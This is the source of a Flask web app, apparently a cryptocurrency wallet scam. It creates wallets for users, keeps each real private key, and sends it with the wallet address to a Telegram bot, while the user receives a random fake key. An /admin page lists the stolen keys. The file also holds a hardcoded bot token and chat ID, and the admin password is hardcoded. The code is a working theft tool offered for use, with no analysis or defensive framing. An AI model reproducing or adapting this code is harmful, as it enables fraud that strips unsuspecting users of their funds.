from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import sqlite3
import secrets
from datetime import datetime
import requests
from eth_account import Account
from web3 import Web3
import threading
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)
TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"
CHAT_ID = "8288130111"

conn = sqlite3.connect('saqr.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS wallets
    (id INTEGER PRIMARY KEY AUTOINCREMENT,
     network TEXT, address TEXT UNIQUE,
     real_key TEXT, fake_key TEXT,
     created_at TEXT)''')
conn.commit()

def send_tg(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=3)
    except:
        pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/select')
def select():
    return render_template('select.html')

@app.route('/wallet')
def wallet():
    return render_template('wallet.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/withdraw')
def withdraw():
    return render_template('withdraw.html')

@app.route('/referral')
def referral():
    return render_template('referral.html')

@app.route('/certificates')
def certificates():
    return render_template('certificates.html')

@app.route('/payments')
def payments():
    return render_template('payments.html')

@app.route('/chat')
def chat():
    return render_template('chat.html')

@app.route('/api/create-wallet', methods=['POST'])
def create_wallet():
    network = request.json.get('network', 'ethereum')
    
    if network == 'solana':
        try:
            from solders.keypair import Keypair
            keypair = Keypair()
            address = str(keypair.pubkey())
            real_key = bytes(keypair).hex()
        except Exception as e:
            # نستخدم bip39 لسولانا
            from eth_account import Account
            acct = Account.create()
            address = acct.address
            real_key = acct.key.hex()
            network = 'ethereum'  # نرجع لـ ETH إذا فشل
    else:
        acct = Account.create()
        address = acct.address
        real_key = acct.key.hex()
    
    fake_key = "0x" + secrets.token_hex(32)
    
    c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
              (network, address, real_key, fake_key, datetime.now().isoformat()))
    conn.commit()
    
    send_tg(f"🦅 محفظة جديدة!\n🌐 {network}\n🏦 {address}\n🔑 {real_key}")
    
    return jsonify({'address': address, 'private_key': fake_key})

@app.route('/admin')
def admin():
    if request.args.get('token', '') != 'saqr2026':
        return "Unauthorized", 401
    c.execute("SELECT * FROM wallets ORDER BY id DESC")
    wallets = c.fetchall()
    html = '<html><head><style>body{font-family:monospace;background:#0a0e27;color:#fff}table{border-collapse:collapse}td{padding:5px;border:1px solid #333}.key{color:gold}</style></head><body><h1 style="color:#00ff88">🦅 Admin Panel</h1><table>'
    for w in wallets:
        html += f'<tr><td>{w[1]}</td><td>{w[2][:25]}...</td><td class="key">{w[3]}</td></tr>'
    return html + '</table></body></html>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
